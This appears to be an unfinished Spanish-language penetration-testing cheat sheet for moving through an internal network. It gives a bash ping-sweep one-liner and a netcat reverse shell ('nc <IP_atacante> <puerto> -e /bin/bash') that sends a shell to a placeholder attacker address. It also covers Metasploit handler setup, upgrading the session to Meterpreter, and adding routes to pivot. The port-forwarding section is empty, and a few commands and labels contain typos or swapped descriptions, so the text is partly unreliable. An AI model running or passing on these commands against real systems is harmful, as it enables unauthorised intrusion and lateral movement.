
## 1. Escanear la Red Interna

Ping sweep con one liner:

```shell
for i in {1..254}; do (ping -c 1 -W 1 <192.168.1>.$i | grep "bytes frome" &) ;done
```

## 2. Conseguir sesión de Shell

Recibir conexión:

```bash
nc <IP_atacante> <puerto> -e /bin/bash
```

Enviar conexión:

```msf6
sudo msfconsole -q
use multi/handler
options set LHOST <IP_atacante>
set LPORT <mismo_puerto>
run 
```

Enviar la Sesion a Segundo Plano

```bash
Ctrl+Z
sessions
```

## 3. Conseguir sesión Meterpreter

```msf6
use post/multi/manage/shell_to_meterpreter
options
set LHOST <IP_atacante>
set SESSION 1
run 
```

```msf6
sessions
session -i 2
Ctrl+Z
```

## 3. Route add

```msf6
route
route add <red_interna/24> 2
route
```
> `route del <red>` para eliminar una red añadida.

## 4. Port Forwarding



## 5. 